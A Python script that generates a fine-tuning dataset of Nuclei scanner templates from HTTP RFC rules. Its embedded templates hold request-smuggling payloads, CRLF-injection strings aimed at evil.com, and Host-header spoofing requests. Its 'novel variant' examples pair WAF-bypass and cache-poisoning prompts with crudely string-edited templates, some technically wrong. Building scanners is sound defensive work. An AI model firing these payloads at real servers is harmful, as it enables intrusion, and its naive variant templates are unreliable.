#!/usr/bin/env python3
"""
RFC-Based Vulnerability Training System
Combines RFC specifications with known vulnerabilities to generate comprehensive test cases
"""

import json
import re
import requests
from pathlib import Path
from typing import List, Dict, Any, Tuple
from dataclasses import dataclass
import urllib.parse

@dataclass
class RFCRule:
    """RFC specification rule"""
    rfc_number: int
    section: str
    rule_text: str
    should_behavior: str
    must_not_behavior: str
    violation_examples: List[str]
    vulnerability_implications: List[str]

@dataclass
class VulnerabilityPattern:
    """Vulnerability based on RFC violations"""
    name: str
    rfc_violations: List[RFCRule]
    attack_vectors: List[str]
    detection_methods: List[str]
    nuclei_template: str

class RFCVulnerabilityGenerator:
    def __init__(self):
        self.rfc_rules = {}
        self.vulnerability_patterns = {}
        self.training_examples = []
        
    def load_rfc_specifications(self):
        """Load key RFC specifications relevant to web security"""
        
        # RFC 7230 - HTTP/1.1 Message Syntax and Routing
        http_11_rules = [
            RFCRule(
                rfc_number=7230,
                section="3.2.6",
                rule_text="Header field values MUST NOT contain CR or LF characters",
                should_behavior="Reject headers containing CRLF",
                must_not_behavior="Process headers with embedded CRLF",
                violation_examples=[
                    "User-Agent: Mozilla\\r\\nInjected-Header: malicious",
                    "Referer: http://evil.com\\r\\nSet-Cookie: admin=true"
                ],
                vulnerability_implications=["CRLF Injection", "HTTP Response Splitting", "Header Injection"]
            ),
            
            RFCRule(
                rfc_number=7230,
                section="3.3.3",
                rule_text="If a message contains both Content-Length and Transfer-Encoding, Transfer-Encoding takes precedence",
                should_behavior="Use Transfer-Encoding and ignore Content-Length",
                must_not_behavior="Use Content-Length when Transfer-Encoding is present",
                violation_examples=[
                    "Content-Length: 13\\r\\nTransfer-Encoding: chunked",
                    "Transfer-Encoding: chunked\\r\\nContent-Length: 0"
                ],
                vulnerability_implications=["HTTP Request Smuggling", "Cache Poisoning"]
            ),
            
            RFCRule(
                rfc_number=7230,
                section="4.1.1",
                rule_text="Chunk extensions SHOULD be ignored if not understood",
                should_behavior="Ignore unknown chunk extensions gracefully",
                must_not_behavior="Fail parsing on unknown extensions",
                violation_examples=[
                    "5;malicious=payload\\r\\nhello\\r\\n0\\r\\n\\r\\n",
                    "a;x=\\\"evil\\\";y=attack\\r\\n0123456789\\r\\n0\\r\\n\\r\\n"
                ],
                vulnerability_implications=["Request Smuggling", "Parser Confusion", "Bypass WAF"]
            ),
            
            RFCRule(
                rfc_number=7230,
                section="5.4",
                rule_text="Host header field MUST be sent in all HTTP/1.1 requests",
                should_behavior="Require Host header in HTTP/1.1",
                must_not_behavior="Accept HTTP/1.1 requests without Host",
                violation_examples=[
                    "GET / HTTP/1.1\\r\\n\\r\\n",  # Missing Host
                    "Host: evil.com\\r\\nHost: victim.com"  # Multiple Host headers
                ],
                vulnerability_implications=["Host Header Injection", "Virtual Host Confusion"]
            )
        ]
        
        # RFC 7231 - HTTP/1.1 Semantics and Content
        http_semantics_rules = [
            RFCRule(
                rfc_number=7231,
                section="4.3.1",
                rule_text="GET method SHOULD NOT have significant side effects",
                should_behavior="Treat GET as safe and idempotent",
                must_not_behavior="Allow state changes via GET",
                violation_examples=[
                    "GET /deleteUser?id=123",
                    "GET /admin/changePassword?new=evil"
                ],
                vulnerability_implications=["CSRF", "Unintended Actions", "State Manipulation"]
            ),
            
            RFCRule(
                rfc_number=7231,
                section="6.4.7",
                rule_text="307 Temporary Redirect MUST maintain original method",
                should_behavior="Preserve POST method on 307 redirect",
                must_not_behavior="Change POST to GET on 307",
                violation_examples=[
                    "POST -> 307 -> GET conversion",
                    "Redirect with method downgrade"
                ],
                vulnerability_implications=["Method Override", "CSRF", "Security Bypass"]
            )
        ]
        
        # RFC 6265 - HTTP State Management (Cookies)
        cookie_rules = [
            RFCRule(
                rfc_number=6265,
                section="4.1.1",
                rule_text="Cookie names and values MUST NOT contain control characters",
                should_behavior="Reject cookies with control characters",
                must_not_behavior="Accept malformed cookie values",
                violation_examples=[
                    "Set-Cookie: session=abc\\r\\ndef\\r\\n",
                    "Set-Cookie: user=admin\\x00\\x01"
                ],
                vulnerability_implications=["Cookie Injection", "Session Manipulation"]
            ),
            
            RFCRule(
                rfc_number=6265,
                section="5.2.1",
                rule_text="Secure attribute limits cookie to HTTPS",
                should_behavior="Only send Secure cookies over HTTPS",
                must_not_behavior="Send Secure cookies over HTTP",
                violation_examples=[
                    "HTTP request with Secure cookie",
                    "Mixed HTTP/HTTPS cookie handling"
                ],
                vulnerability_implications=["Session Hijacking", "Man-in-the-Middle"]
            )
        ]
        
        # Compile all rules
        all_rules = http_11_rules + http_semantics_rules + cookie_rules
        
        for rule in all_rules:
            key = f"RFC{rule.rfc_number}_{rule.section.replace('.', '_')}"
            self.rfc_rules[key] = rule
        
        print(f"âœ… Loaded {len(all_rules)} RFC rules")
    
    def generate_vulnerability_patterns(self):
        """Generate vulnerability patterns from RFC violations"""
        
        patterns = {}
        
        # HTTP Request Smuggling Pattern
        smuggling_rules = [rule for rule in self.rfc_rules.values() 
                          if "Transfer-Encoding" in rule.rule_text or "Content-Length" in rule.rule_text]
        
        patterns["http_request_smuggling"] = VulnerabilityPattern(
            name="HTTP Request Smuggling",
            rfc_violations=smuggling_rules,
            attack_vectors=[
                "CL.TE: Content-Length conflicts with Transfer-Encoding",
                "TE.CL: Transfer-Encoding conflicts with Content-Length", 
                "TE.TE: Multiple Transfer-Encoding headers",
                "Chunk extension manipulation"
            ],
            detection_methods=[
                "Send conflicting CL/TE headers",
                "Use malformed chunk extensions",
                "Test with multiple TE headers",
                "Probe backend/frontend parsing differences"
            ],
            nuclei_template=""  # Will be generated
        )
        
        # CRLF Injection Pattern  
        crlf_rules = [rule for rule in self.rfc_rules.values() 
                     if "CR" in rule.rule_text or "LF" in rule.rule_text]
        
        patterns["crlf_injection"] = VulnerabilityPattern(
            name="CRLF Injection",
            rfc_violations=crlf_rules,
            attack_vectors=[
                "Header injection via CRLF in parameters",
                "HTTP response splitting",
                "Log injection with CRLF"
            ],
            detection_methods=[
                "Inject \\r\\n in URL parameters",
                "Test CRLF in HTTP headers",
                "Check for injected headers in response"
            ],
            nuclei_template=""
        )
        
        # Host Header Injection
        host_rules = [rule for rule in self.rfc_rules.values() 
                     if "Host" in rule.rule_text]
        
        patterns["host_header_injection"] = VulnerabilityPattern(
            name="Host Header Injection",
            rfc_violations=host_rules,
            attack_vectors=[
                "Multiple Host headers",
                "Missing Host header",
                "Malformed Host values",
                "Host override headers"
            ],
            detection_methods=[
                "Send multiple Host headers",
                "Test X-Forwarded-Host override",
                "Use malformed Host values",
                "Check virtual host confusion"
            ],
            nuclei_template=""
        )
        
        self.vulnerability_patterns = patterns
        print(f"âœ… Generated {len(patterns)} vulnerability patterns")
    
    def generate_nuclei_templates(self):
        """Generate nuclei templates for each vulnerability pattern"""
        
        for vuln_name, pattern in self.vulnerability_patterns.items():
            template = self._generate_template_from_pattern(vuln_name, pattern)
            pattern.nuclei_template = template
        
        print("âœ… Generated nuclei templates for all patterns")
    
    def _generate_template_from_pattern(self, vuln_name: str, pattern: VulnerabilityPattern) -> str:
        """Generate specific nuclei template from vulnerability pattern"""
        
        if vuln_name == "http_request_smuggling":
            return self._generate_smuggling_template(pattern)
        elif vuln_name == "crlf_injection":
            return self._generate_crlf_template(pattern)
        elif vuln_name == "host_header_injection":
            return self._generate_host_template(pattern)
        else:
            return self._generate_generic_template(vuln_name, pattern)
    
    def _generate_smuggling_template(self, pattern: VulnerabilityPattern) -> str:
        """Generate HTTP Request Smuggling template"""
        
        return '''id: http-request-smuggling-rfc7230

info:
  name: HTTP Request Smuggling - RFC 7230 Violation
  description: |
    Tests for HTTP Request Smuggling vulnerabilities by exploiting RFC 7230 violations.
    Specifically targets Content-Length vs Transfer-Encoding conflicts and chunk extension parsing.
  severity: high
  author: rfc-vulnerability-generator
  reference:
    - https://tools.ietf.org/html/rfc7230#section-3.3.3
    - https://portswigger.net/web-security/request-smuggling
  tags:
    - http
    - smuggling
    - rfc7230

http:
  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Length: 13
        Transfer-Encoding: chunked
        Connection: keep-alive
        
        0
        
        SMUGGLED
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Length: 6
        Transfer-Encoding: chunked
        
        5;x=evil
        hello
        0
        
        
    matchers:
      - type: word
        words:
          - "SMUGGLED"
          - "400 Bad Request"
          - "502 Bad Gateway"
        condition: or
        
      - type: regex
        regex:
          - "HTTP\\/[0-9]\\.[0-9] [45][0-9][0-9]"'''
    
    def _generate_crlf_template(self, pattern: VulnerabilityPattern) -> str:
        """Generate CRLF Injection template"""
        
        return '''id: crlf-injection-rfc7230

info:
  name: CRLF Injection - RFC 7230 Header Violation
  description: |
    Tests for CRLF injection vulnerabilities by violating RFC 7230 header field rules.
    Attempts to inject carriage return and line feed characters in HTTP headers.
  severity: medium
  author: rfc-vulnerability-generator
  reference:
    - https://tools.ietf.org/html/rfc7230#section-3.2.6
    - https://owasp.org/www-community/vulnerabilities/CRLF_Injection
  tags:
    - http
    - crlf
    - injection
    - rfc7230

http:
  - method: GET
    path:
      - "{{BaseURL}}/?redirect=http://evil.com%0d%0aSet-Cookie:%20injected=true"
      - "{{BaseURL}}/?param=test%0d%0aInjected-Header:%20malicious"
    
    headers:
      User-Agent: "Mozilla/5.0\\r\\nX-Injected-Header: crlf-test"
      Referer: "http://{{Hostname}}\\r\\nSet-Cookie: admin=true"
    
    matchers:
      - type: word
        words:
          - "Set-Cookie: injected"
          - "X-Injected-Header: crlf"
          - "Injected-Header: malicious"
        condition: or
        
      - type: regex
        regex:
          - "Set-Cookie:.*injected"
          - "X-.*-Header:.*crlf"'''
    
    def _generate_host_template(self, pattern: VulnerabilityPattern) -> str:
        """Generate Host Header Injection template"""
        
        return '''id: host-header-injection-rfc7230

info:
  name: Host Header Injection - RFC 7230 Violation
  description: |
    Tests for Host header injection by violating RFC 7230 Host header requirements.
    Attempts multiple Host headers and host override techniques.
  severity: medium
  author: rfc-vulnerability-generator
  reference:
    - https://tools.ietf.org/html/rfc7230#section-5.4
    - https://portswigger.net/web-security/host-header
  tags:
    - http
    - host-header
    - injection
    - rfc7230

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        Host: evil.com
        Connection: close
        
      - |
        GET / HTTP/1.1
        Host: evil.com
        X-Forwarded-Host: {{Hostname}}
        Connection: close
        
      - |
        GET / HTTP/1.1
        X-Host: evil.com
        X-Forwarded-Host: malicious.com
        Connection: close
        
    matchers:
      - type: word
        words:
          - "evil.com"
          - "malicious.com"
          - "Location: http://evil.com"
        condition: or
        
      - type: status
        status:
          - 302
          - 301'''
    
    def _generate_generic_template(self, vuln_name: str, pattern: VulnerabilityPattern) -> str:
        """Generate generic template for other patterns"""
        
        template_id = vuln_name.replace("_", "-")
        
        # Extract RFC references
        rfc_refs = list(set([f"RFC {rule.rfc_number}" for rule in pattern.rfc_violations]))
        
        return f'''id: {template_id}-rfc-violation

info:
  name: {pattern.name} - RFC Violation
  description: |
    Tests for {pattern.name} by exploiting RFC specification violations.
    Based on: {', '.join(rfc_refs)}
  severity: medium
  author: rfc-vulnerability-generator
  reference:
{chr(10).join(f"    - RFC {rule.rfc_number} Section {rule.section}" for rule in pattern.rfc_violations[:3])}
  tags:
    - http
    - rfc-violation
    - {vuln_name.replace("_", "-")}

http:
  - method: GET
    path:
      - "{{{{BaseURL}}}}"
    
    matchers:
      - type: word
        words:
          - "error"
          - "violation"
        condition: or'''
    
    def generate_training_data(self) -> List[Dict[str, str]]:
        """Generate training data combining RFC knowledge with vulnerabilities"""
        
        training_examples = []
        
        # Generate examples for each vulnerability pattern
        for vuln_name, pattern in self.vulnerability_patterns.items():
            
            # Basic template generation request
            basic_instruction = f"Create a nuclei template for {pattern.name}"
            training_examples.append({
                "instruction": basic_instruction,
                "response": pattern.nuclei_template,
                "category": "rfc_violation",
                "vulnerability": vuln_name
            })
            
            # RFC-specific requests
            for rule in pattern.rfc_violations:
                rfc_instruction = f"Create a nuclei template that tests for RFC {rule.rfc_number} section {rule.section} violations related to {pattern.name}"
                training_examples.append({
                    "instruction": rfc_instruction,
                    "response": pattern.nuclei_template,
                    "category": "rfc_specific",
                    "rfc_number": rule.rfc_number,
                    "rfc_section": rule.section
                })
            
            # Attack vector specific requests
            for attack_vector in pattern.attack_vectors:
                attack_instruction = f"Generate a nuclei template to detect {attack_vector}"
                training_examples.append({
                    "instruction": attack_instruction,
                    "response": pattern.nuclei_template,
                    "category": "attack_vector",
                    "attack_method": attack_vector
                })
            
            # Novel vulnerability requests (the key benefit!)
            novel_instructions = [
                f"Create a template for a new {pattern.name} variant that exploits server parsing differences",
                f"Generate a nuclei template for {pattern.name} in HTTP/2 environments",
                f"Build a template that combines {pattern.name} with cache poisoning",
                f"Create an advanced {pattern.name} template that bypasses common WAF rules"
            ]
            
            for novel_instruction in novel_instructions:
                # Modify template for novel scenarios
                modified_template = self._adapt_template_for_novel_scenario(pattern.nuclei_template, novel_instruction)
                training_examples.append({
                    "instruction": novel_instruction,
                    "response": modified_template,
                    "category": "novel_variant",
                    "base_vulnerability": vuln_name
                })
        
        # Generate RFC compliance testing examples
        rfc_compliance_examples = self._generate_rfc_compliance_examples()
        training_examples.extend(rfc_compliance_examples)
        
        self.training_examples = training_examples
        print(f"âœ… Generated {len(training_examples)} training examples")
        
        return training_examples
    
    def _adapt_template_for_novel_scenario(self, base_template: str, instruction: str) -> str:
        """Adapt base template for novel scenarios"""
        
        # Simple adaptations based on instruction keywords
        if "http/2" in instruction.lower():
            # Modify for HTTP/2
            modified = base_template.replace("HTTP/1.1", "HTTP/2.0")
            modified = modified.replace("Connection: close", "")
        elif "waf" in instruction.lower():
            # Add WAF bypass techniques
            modified = base_template.replace("User-Agent:", "X-Real-IP: 127.0.0.1\\r\\nUser-Agent:")
        elif "cache" in instruction.lower():
            # Add cache poisoning elements
            modified = base_template.replace("Host: {{Hostname}}", "Host: {{Hostname}}\\r\\nX-Forwarded-Host: evil.com")
        else:
            # Generic enhancement
            modified = base_template.replace("severity: medium", "severity: high")
        
        return modified
    
    def _generate_rfc_compliance_examples(self) -> List[Dict[str, str]]:
        """Generate examples for testing RFC compliance"""
        
        examples = []
        
        for rule_key, rule in self.rfc_rules.items():
            
            # Positive compliance test
            compliance_instruction = f"Create a nuclei template that verifies RFC {rule.rfc_number} section {rule.section} compliance"
            
            compliance_template = f'''id: rfc{rule.rfc_number}-{rule.section.replace(".", "-")}-compliance

info:
  name: RFC {rule.rfc_number} Section {rule.section} Compliance Test
  description: |
    Verifies that the server properly implements RFC {rule.rfc_number} section {rule.section}.
    Rule: {rule.rule_text}
  severity: info
  author: rfc-compliance-tester
  reference:
    - https://tools.ietf.org/html/rfc{rule.rfc_number}#section-{rule.section}

http:
  - method: GET
    path:
      - "{{{{BaseURL}}}}"
    
    matchers:
      - type: word
        words:
          - "compliant"
          - "valid"
        condition: or'''
            
            examples.append({
                "instruction": compliance_instruction,
                "response": compliance_template,
                "category": "rfc_compliance",
                "rfc_number": rule.rfc_number
            })
        
        return examples
    
    def save_training_data(self, output_file: str = "rfc_vulnerability_training.jsonl"):
        """Save training data in JSONL format"""
        
        with open(output_file, 'w') as f:
            for example in self.training_examples:
                json.dump(example, f, ensure_ascii=False)
                f.write('\\n')
        
        print(f"âœ… Saved {len(self.training_examples)} examples to {output_file}")

def main():
    """Generate RFC-based vulnerability training data"""
    
    print("=== RFC-Based Vulnerability Training Generator ===\\n")
    
    generator = RFCVulnerabilityGenerator()
    
    # Load RFC specifications
    generator.load_rfc_specifications()
    
    # Generate vulnerability patterns
    generator.generate_vulnerability_patterns()
    
    # Generate nuclei templates
    generator.generate_nuclei_templates()
    
    # Generate training data
    training_data = generator.generate_training_data()
    
    # Save training data
    generator.save_training_data()
    
    # Display sample templates
    print("\\n=== Sample Generated Templates ===")
    for vuln_name, pattern in generator.vulnerability_patterns.items():
        print(f"\\n{pattern.name}:")
        print("-" * 50)
        print(pattern.nuclei_template[:500] + "..." if len(pattern.nuclei_template) > 500 else pattern.nuclei_template)
    
    print(f"\\nâœ… Generated comprehensive RFC-based training dataset!")
    print(f"ğŸ“Š Total training examples: {len(training_data)}")
    print(f"ğŸ“‹ Categories: {set(ex['category'] for ex in training_data)}")

if __name__ == "__main__":
    main()
